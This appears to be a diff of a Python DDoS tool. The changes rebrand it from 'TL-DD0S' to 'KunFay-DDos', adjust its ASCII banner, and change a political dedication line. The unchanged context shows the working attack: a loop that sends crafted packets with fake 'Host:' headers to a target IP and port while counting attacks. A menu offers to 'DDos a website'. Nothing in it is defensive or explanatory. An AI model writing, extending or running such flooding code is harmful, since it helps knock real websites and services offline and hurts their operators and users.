@@ -51,7 +51,7 @@ def ddos():
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_num += 1
-                print("[💥]  \033[93mTL-DD0S  \033[32mAttack number \033[97m——> \033[0m"+ str(attack_num))
+                print("[💥]  \033[93mKunFay-DDos  \033[32mAttack number \033[97m——> \033[0m"+ str(attack_num))
             except socket.error:
                 print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK IP OR PORT')
                 break
@@ -63,10 +63,10 @@ def ddos():
 def print_red_centered_art():
     os.system("clear")
     art = '''
-                          ╔════════╗                        ╔════════╗
-                          ║╔═══════╝                        ║╔═══════╝        
-                          ║║              ╔═╗               ║║
-                          ║║              ╚═╝               ║║
+                          ╔════════╗                       ╔════════╗
+                          ║╔═══════╝                       ║╔═══════╝        
+                          ║║              ╔═╗              ║║
+                          ║║              ╚═╝              ║║
                           ║║            ╔═════╗            ║║
       ╔═╗                 ║║            ║╔═══╗║    ╔═╗     ║║
       ╚═╝      ╔═════╗    ║║            ║╚═══╝║    ╚═╝   ╔═╝║
@@ -78,15 +78,16 @@ def print_red_centered_art():
                ╔════╝║      
                ║     ║        ╔═╗ ╔═╗
                ╚═════╝        ╚═╝ ╚═╝
-        
-        
-        '''
+╔═════════════════════════════════════════════════════╗       
+║                                                  ║ 
+╚═════════════════════════════════════════════════════╝      
+'''
     red_art = f"{Fore.GREEN}{art}{Style.RESET_ALL}"  # Set th text color to red
     print(red_art.center(80))  # Adjust the width (80 characters) to match your terminal size
     #red_art2 = f"{Fore.RED}{art2}{Style.RESET_ALL}"
     red_art2 = f"{Fore.YELLOW}{Style.RESET_ALL}"
     print((80))
-    print(Fore.YELLOW + Style.BRIGHT + "[KING's dedication and struggle for PALESTINE]")
+    print(Fore.YELLOW + Style.BRIGHT + "[KUNFAY's dedication and struggle for PALESTINE]")
 if __name__ == "__main__":
     print_red_centered_art()
 def menu():
@@ -95,7 +96,7 @@ def menu():
     print(Fore.WHITE + Style.BRIGHT + "—————————————————————————————————————————————————————————————————")
     print(Fore.YELLOW + Style.BRIGHT + "Silahkan ketik 1 untuk melanjutkan...")
     print(Fore.BLUE + Style.BRIGHT + "1. DDos a website.  [1]")
-    print(Fore.WHITE + Style.BRIGHT + "2. exit.            [2]")
+    print(Fore.WHITE + Style.BRIGHT + "2. exit.           [2]")
     print("Enter your options .. [e.g 1,2]") 
     global usr
     usr = input(Fore.YELLOW + Style.BRIGHT + "0======>> " )
